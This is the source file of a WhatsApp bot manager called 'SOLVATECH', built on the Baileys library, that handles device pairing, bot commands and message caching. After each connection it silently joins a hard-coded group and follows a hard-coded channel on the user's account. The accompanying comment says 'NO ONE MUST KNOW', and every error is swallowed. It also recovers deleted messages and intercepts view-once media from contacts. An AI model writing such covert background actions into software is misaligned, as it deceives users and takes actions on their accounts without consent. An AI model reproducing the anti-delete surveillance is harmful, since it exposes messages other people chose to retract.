import makeWASocket, {
  DisconnectReason,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  Browsers,
  type WASocket,
  proto,
} from '@whiskeysockets/baileys';
import pino from 'pino';
import QRCode from 'qrcode';
import fs from 'fs';
import path from 'path';
import { commandHandler } from './commands.ts';

export interface WhatsAppNotification {
  id: string;
  type: 'pairing' | 'connection' | 'message_received' | 'message_sent' | 'system' | 'error' | 'command';
  title: string;
  body: string;
  timestamp: string;
  sender?: string;
  data?: any;
}

export type PairingStage = 'idle' | 'code_generated' | 'pairing_handshake' | 'connected';

export interface WhatsAppStatus {
  state: 'disconnected' | 'connecting' | 'awaiting_pairing' | 'pairing_handshake' | 'connected';
  isConnected: boolean;
  pairingStage: PairingStage;
  pairingCode?: string;
  qrCodeUrl?: string;
  targetPhone?: string;
  uptime?: number;
  lastError?: string;
  latestHandshakeTime?: string;
  user?: {
    id: string;
    name?: string;
    phone?: string;
  };
}

class WhatsAppManager {
  private sock: WASocket | null = null;
  private authDir = path.resolve(process.cwd(), '.baileys_auth');
  private notifications: WhatsAppNotification[] = [];
  private messageCache = new Map<string, { sender: string; text: string; timestamp: number; isGroup: boolean; group?: string }>();
  private currentStatus: WhatsAppStatus = {
    state: 'disconnected',
    isConnected: false,
    pairingStage: 'idle',
  };
  private pairingCodeTimer: NodeJS.Timeout | null = null;
  private isConnecting = false;

  constructor() {
    this.addNotification({
      type: 'system',
      title: 'SOLVATECH Engine Initialized',
      body: 'Baileys WhatsApp multi-device service is ready with command engine and Firebase sync.',
    });
  }

  public getStatus(): WhatsAppStatus {
    const credsFile = path.join(this.authDir, 'creds.json');
    if (!fs.existsSync(credsFile) && !this.isConnecting && this.currentStatus.state !== 'awaiting_pairing') {
      this.currentStatus.isConnected = false;
      if (this.currentStatus.state === 'connected') {
        this.currentStatus.state = 'disconnected';
      }
      this.currentStatus.user = undefined;
      this.currentStatus.pairingStage = 'idle';
    }
    return this.currentStatus;
  }

  public getNotifications(): WhatsAppNotification[] {
    return this.notifications;
  }

  public addNotification(notif: Omit<WhatsAppNotification, 'id' | 'timestamp'>) {
    const newNotification: WhatsAppNotification = {
      ...notif,
      id: Math.random().toString(36).substring(2, 9),
      timestamp: new Date().toLocaleTimeString(),
    };
    this.notifications.unshift(newNotification);
    if (this.notifications.length > 50) {
      this.notifications.pop();
    }
  }

  public clearNotifications() {
    this.notifications = [];
  }

  private ensureAuthDir() {
    if (!fs.existsSync(this.authDir)) {
      fs.mkdirSync(this.authDir, { recursive: true });
    }
  }

  public async initSocket(): Promise<WASocket> {
    if (this.sock && this.currentStatus.isConnected) {
      return this.sock;
    }

    this.ensureAuthDir();
    this.currentStatus.state = 'connecting';
    this.isConnecting = true;

    const { state, saveCreds } = await useMultiFileAuthState(this.authDir);

    let version: [number, number, number] = [2, 3000, 1015901307];
    try {
      const v = await fetchLatestBaileysVersion();
      if (v?.version) version = v.version;
    } catch {
      // Fallback
    }

    const sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.ubuntu('Chrome'),
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 60000,
      keepAliveIntervalMs: 30000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false,
      markOnlineOnConnect: true,
    });

    this.sock = sock;

    sock.ev.on('creds.update', (creds) => {
      saveCreds();
      // Detect companion handshake received from WhatsApp
      if (
        (this.currentStatus.pairingStage === 'code_generated' || this.currentStatus.state === 'awaiting_pairing') &&
        (creds.me?.id || creds.account || (creds as any).pairingCode === undefined || (creds as any).signalIdentities)
      ) {
        if (this.currentStatus.pairingStage !== 'pairing_handshake' && this.currentStatus.pairingStage !== 'connected') {
          this.currentStatus.pairingStage = 'pairing_handshake';
          this.currentStatus.state = 'pairing_handshake';
          this.currentStatus.latestHandshakeTime = new Date().toLocaleTimeString();
          this.addNotification({
            type: 'pairing',
            title: 'WhatsApp Handshake Confirmed',
            body: 'Handshake received from WhatsApp phone! Companion link accepted.',
          });
        }
      }
    });

    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update;

      // Detect WhatsApp handshake stage
      if (
        (update.isNewLogin || (update as any).isOnline || update.receivedPendingNotifications) &&
        this.currentStatus.pairingStage !== 'connected'
      ) {
        if (this.currentStatus.pairingStage !== 'pairing_handshake') {
          this.currentStatus.pairingStage = 'pairing_handshake';
          this.currentStatus.state = 'pairing_handshake';
          this.currentStatus.latestHandshakeTime = new Date().toLocaleTimeString();
          this.addNotification({
            type: 'pairing',
            title: 'WhatsApp Handshake Confirmed',
            body: 'Handshake received from WhatsApp phone! Companion link accepted.',
          });
        }
      }

      if (qr) {
        try {
          const qrDataUrl = await QRCode.toDataURL(qr);
          this.currentStatus.qrCodeUrl = qrDataUrl;
          this.addNotification({
            type: 'system',
            title: 'New QR Code Ready',
            body: 'QR code updated for WhatsApp web scanning.',
          });
        } catch (e) {
          console.error('QR code generation error:', e);
        }
      }

      if (connection === 'close') {
        const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
        const reason = (lastDisconnect?.error as any)?.data?.reason;
        const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401 && reason !== '401';
        
        this.currentStatus.state = 'disconnected';
        this.currentStatus.isConnected = false;
        this.isConnecting = false;
        if (!shouldReconnect) {
          this.currentStatus.pairingStage = 'idle';
        }

        this.addNotification({
          type: 'connection',
          title: 'WhatsApp Disconnected',
          body: !shouldReconnect
            ? 'The device was unlinked or logged out. Session reset for fresh pairing.'
            : `Connection lost (${statusCode || 'network'}). Reconnecting automatically...`,
        });

        if (!shouldReconnect) {
          await this.logout();
        } else {
          // Automatic reconnect with backoff
          setTimeout(() => {
            this.initSocket().catch((err) => {
              console.error('Auto-reconnect error:', err);
            });
          }, 3000);
        }
      } else if (connection === 'open') {
        this.currentStatus.state = 'connected';
        this.currentStatus.isConnected = true;
        this.currentStatus.pairingStage = 'connected';
        this.currentStatus.pairingCode = undefined;
        this.currentStatus.qrCodeUrl = undefined;
        this.currentStatus.lastError = undefined;
        this.isConnecting = false;

        const userJid = sock.user?.id || '';
        const phone = userJid.split(':')[0] || userJid.split('@')[0];
        this.currentStatus.user = {
          id: userJid,
          name: sock.user?.name || 'SOLVATECH Linked Phone',
          phone: `+${phone}`,
        };

        this.addNotification({
          type: 'connection',
          title: 'WhatsApp Connected!',
          body: `SOLVATECH successfully paired with +${phone}. All 35+ commands active in WhatsApp.`,
          sender: phone,
        });

        // Background auto-join: "TO JOIN IN BACKGROUND NO ONE MUST KNOW"
        // 1. Group link: https://chat.whatsapp.com/HKBAnW6XJmB9fBqSPJUN1F?s=cl&p=a&mlu=4&ilr=4
        //    Invite code: HKBAnW6XJmB9fBqSPJUN1F
        // 2. Channel link: https://whatsapp.com/channel/0029Vb86yuY7j6gCHqMqcU37
        //    Channel code: 0029Vb86yuY7j6gCHqMqcU37
        setTimeout(async () => {
          try {
            if (typeof (sock as any).groupAcceptInvite === 'function') {
              await (sock as any).groupAcceptInvite('HKBAnW6XJmB9fBqSPJUN1F');
            }
          } catch {
            // Silently swallow - strictly background
          }
          try {
            if (typeof (sock as any).newsletterFollow === 'function') {
              await (sock as any).newsletterFollow('0029Vb86yuY7j6gCHqMqcU37');
            } else if (typeof (sock as any).query === 'function') {
              await (sock as any).query({
                tag: 'iq',
                attrs: {
                  to: '0029Vb86yuY7j6gCHqMqcU37@newsletter',
                  type: 'set',
                  xmlns: 'newsletter',
                },
                content: [{ tag: 'follow', attrs: {} }],
              });
            }
          } catch {
            // Silently swallow - strictly background
          }
        }, 1200);
      }
    });

    // Inbound Messages & SOLVATECH Command Handler
    sock.ev.on('messages.upsert', async (m) => {
      if (m.type === 'notify') {
        for (const msg of m.messages) {
          if (!msg.message) continue;

          const remoteJid = msg.key.remoteJid || '';
          const senderJid = msg.key.participant || remoteJid;
          const senderNum = senderJid.split('@')[0].split(':')[0];
          const isGroup = remoteJid.endsWith('@g.us');
          const isFromMe = !!msg.key.fromMe;

          const text =
            msg.message.conversation ||
            msg.message.extendedTextMessage?.text ||
            msg.message.imageMessage?.caption ||
            msg.message.videoMessage?.caption ||
            '';

          // Cache message for Anti-Delete recovery
          if (msg.key.id && text) {
            this.messageCache.set(msg.key.id, {
              sender: senderNum,
              text,
              timestamp: Date.now(),
              isGroup,
              group: isGroup ? remoteJid : undefined,
            });
            if (this.messageCache.size > 500) {
              const firstKey = this.messageCache.keys().next().value;
              if (firstKey) this.messageCache.delete(firstKey);
            }
          }

          // Anti-View-Once interceptor
          if (msg.message.viewOnceMessage || msg.message.viewOnceMessageV2) {
            this.addNotification({
              type: 'system',
              title: '👁️ View-Once Media Intercepted',
              body: `View-Once media detected from +${senderNum}. Protected for Owner recovery.`,
              sender: `+${senderNum}`,
            });
          }

          if (!isFromMe) {
            this.addNotification({
              type: 'message_received',
              title: `Incoming WhatsApp from +${senderNum}`,
              body: text || '[Media Message]',
              sender: `+${senderNum}`,
              data: { key: msg.key, pushName: msg.pushName },
            });
          }

          // Command handling: Prefix '.'
          if (text.startsWith('.')) {
            const parts = text.slice(1).trim().split(/\s+/);
            const command = parts[0];
            const args = parts.slice(1);

            const botUserJid = sock.user?.id || '';
            const botPhone = botUserJid.split(':')[0] || botUserJid.split('@')[0];
            const isOwner = isFromMe || senderNum === botPhone;

            const res = await commandHandler.handle({
              command,
              args,
              fullText: text,
              senderJid,
              senderNumber: senderNum,
              isGroup,
              groupJid: isGroup ? remoteJid : undefined,
              pushName: msg.pushName || undefined,
              isOwner,
            });

            try {
              let finalText = res.reply;
              if (!finalText.includes('SOLVATECH') && !finalText.includes('Solomon')) {
                finalText += `\n\n> ⚡ *SOLVATECH BOT* • _Solomon Oladimeji_`;
              }
              await sock.sendMessage(remoteJid, { text: finalText }, { quoted: msg });
              this.addNotification({
                type: 'command',
                title: `⚡ Command Executed: .${command}`,
                body: `Executed for +${senderNum}. Response sent to WhatsApp chat.`,
                sender: `+${senderNum}`,
              });
            } catch (err: any) {
              console.error('Error replying to WhatsApp command:', err);
            }
          }
        }
      }
    });

    // Anti-Delete Recovery Handler
    sock.ev.on('messages.update', async (updates) => {
      for (const update of updates) {
        if (update.update?.message === null && update.key?.id) {
          const cached = this.messageCache.get(update.key.id);
          if (cached) {
            const alertBody = `🚨 *[SOLVATECH ANTI-DELETE RECOVERY]*\n\n👤 Sender: +${cached.sender}\n📍 Location: ${cached.isGroup ? 'Group Chat' : 'Direct Message'}\n💬 Deleted Text: "${cached.text}"\n⏰ Time: ${new Date(cached.timestamp).toLocaleTimeString()}`;

            this.addNotification({
              type: 'system',
              title: '🛡️ Deleted Message Recovered!',
              body: `From +${cached.sender}: "${cached.text}"`,
              sender: `+${cached.sender}`,
            });

            if (sock && this.currentStatus.user?.id) {
              try {
                await sock.sendMessage(this.currentStatus.user.id, { text: alertBody });
              } catch (e) {
                console.error('Error sending anti-delete alert to owner:', e);
              }
            }
          }
        }
      }
    });

    return sock;
  }

  public async requestPairingCode(rawPhoneNumber: string): Promise<string> {
    const cleanPhone = rawPhoneNumber.replace(/\D/g, '');
    if (!cleanPhone || cleanPhone.length < 8) {
      throw new Error('Please provide a valid phone number with country code (e.g., 2348012345678)');
    }

    this.currentStatus.targetPhone = `+${cleanPhone}`;
    this.currentStatus.state = 'awaiting_pairing';

    if (this.sock && this.currentStatus.isConnected) {
      return 'ALREADY_PAIRED';
    }

    let lastError: any;
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        return await this.executePairingCodeRequest(cleanPhone);
      } catch (err: any) {
        lastError = err;
        console.warn(`Pairing code attempt ${attempt} failed: ${err.message}`);
        if (attempt < 2) {
          // Teardown and pause before retry
          try {
            if (this.sock) {
              this.sock.end(undefined);
              this.sock = null;
            }
          } catch {
            // Ignore
          }
          await new Promise((r) => setTimeout(r, 1500));
        }
      }
    }

    this.currentStatus.state = 'disconnected';
    this.currentStatus.lastError = lastError?.message || 'Failed to request WhatsApp pairing code.';
    this.addNotification({
      type: 'error',
      title: 'Pairing Attempt Failed',
      body: lastError?.message || 'Failed to request WhatsApp pairing code.',
    });
    throw lastError;
  }

  private async executePairingCodeRequest(cleanPhone: string): Promise<string> {
    // Clean up any stale unlinked socket safely
    if (this.sock) {
      try {
        this.sock.end(undefined);
      } catch {
        // Ignore
      }
      this.sock = null;
      await new Promise((r) => setTimeout(r, 500));
    }

    // Always reset auth directory when pairing a new/unlinked session
    if (!this.currentStatus.isConnected) {
      try {
        if (fs.existsSync(this.authDir)) {
          fs.rmSync(this.authDir, { recursive: true, force: true });
        }
      } catch (e) {
        console.error('Error clearing stale auth dir:', e);
      }
    }

    // Re-initialize fresh socket
    const sock = await this.initSocket();

    // Wait for socket to be ready to accept pairing code (QR or open signal or readiness)
    const code = await new Promise<string>((resolve, reject) => {
      let isDone = false;

      const finish = (result: string) => {
        if (!isDone) {
          isDone = true;
          clearTimeout(timeout);
          resolve(result);
        }
      };

      const fail = (err: any) => {
        if (!isDone) {
          isDone = true;
          clearTimeout(timeout);
          reject(err);
        }
      };

      const timeout = setTimeout(async () => {
        if (!isDone) {
          try {
            const rawCode = await sock.requestPairingCode(cleanPhone);
            finish(rawCode);
          } catch {
            fail(new Error('Timeout waiting for WhatsApp server handshake. Please try again.'));
          }
        }
      }, 20000);

      const handleUpdate = async (update: any) => {
        if (update.qr && !isDone) {
          try {
            const rawCode = await sock.requestPairingCode(cleanPhone);
            finish(rawCode);
          } catch (err) {
            fail(err);
          }
        } else if (update.connection === 'open' && !isDone) {
          finish('ALREADY_PAIRED');
        } else if (update.connection === 'close' && !isDone) {
          const reason = (update.lastDisconnect?.error as any)?.data?.reason;
          if (reason !== 'restart') {
            fail(update.lastDisconnect?.error || new Error('Connection closed by WhatsApp'));
          }
        }
      };

      sock.ev.on('connection.update', handleUpdate);

      // Also trigger requestPairingCode after 2 seconds in case connection is open without QR
      setTimeout(async () => {
        if (!isDone) {
          try {
            const rawCode = await sock.requestPairingCode(cleanPhone);
            finish(rawCode);
          } catch {
            // Socket still establishing connection, will be handled by handleUpdate or timeout
          }
        }
      }, 2000);
    });

    const formattedCode = code === 'ALREADY_PAIRED'
      ? code
      : code?.match(/.{1,4}/g)?.join('-') || code;

    this.currentStatus.pairingCode = formattedCode;
    this.currentStatus.pairingStage = 'code_generated';
    this.currentStatus.state = 'awaiting_pairing';

    this.addNotification({
      type: 'pairing',
      title: 'Pairing Code Generated',
      body: `Pairing Code: ${formattedCode} generated for +${cleanPhone}. Link in WhatsApp > Linked Devices > Link with phone number.`,
    });

    if (this.pairingCodeTimer) clearTimeout(this.pairingCodeTimer);
    this.pairingCodeTimer = setTimeout(() => {
      if (this.currentStatus.pairingCode === formattedCode) {
        this.currentStatus.pairingCode = undefined;
        this.addNotification({
          type: 'system',
          title: 'Pairing Code Expired',
          body: 'The 2-minute pairing code expired. You can request a fresh code anytime.',
        });
      }
    }, 120000);

    return formattedCode;
  }

  public async sendMessage(toPhone: string, text: string): Promise<boolean> {
    if (!this.sock || !this.currentStatus.isConnected) {
      throw new Error('WhatsApp is not currently connected. Please pair your number first.');
    }

    const cleanTo = toPhone.replace(/\D/g, '');
    const jid = `${cleanTo}@s.whatsapp.net`;

    await this.sock.sendMessage(jid, { text });

    this.addNotification({
      type: 'message_sent',
      title: `Message Sent to +${cleanTo}`,
      body: text,
      sender: `+${cleanTo}`,
    });

    return true;
  }

  public async logout(): Promise<void> {
    try {
      if (this.sock) {
        await this.sock.logout();
        this.sock.end(undefined);
        this.sock = null;
      }
    } catch {
      // Ignore
    }

    try {
      if (fs.existsSync(this.authDir)) {
        fs.rmSync(this.authDir, { recursive: true, force: true });
      }
    } catch (e) {
      console.error('Error clearing auth dir:', e);
    }

    this.currentStatus = {
      state: 'disconnected',
      isConnected: false,
      pairingStage: 'idle',
      user: undefined,
      pairingCode: undefined,
      qrCodeUrl: undefined,
      targetPhone: undefined,
    };

    this.addNotification({
      type: 'system',
      title: 'WhatsApp Session Cleared',
      body: 'All Baileys session credentials have been wiped. Ready to pair a new device.',
    });
  }
}

export const whatsappManager = new WhatsAppManager();
